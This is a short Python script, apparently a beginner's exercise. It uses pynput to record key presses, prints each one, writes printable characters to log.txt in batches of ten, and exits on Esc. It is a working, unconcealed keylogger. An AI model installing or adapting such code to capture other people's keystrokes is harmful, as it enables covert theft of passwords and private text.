import pynput

from pynput.keyboard import Key, Listener

keys = []
count = 0

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []
    
def write_file(keys):
    with open("log.txt", "a") as file:
        for key in keys:
            k = str(key).replace("'","")
            if(k.find("space")) > 0:
                file.write(' ')
            elif(k.find("Key") == -1):
                file.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
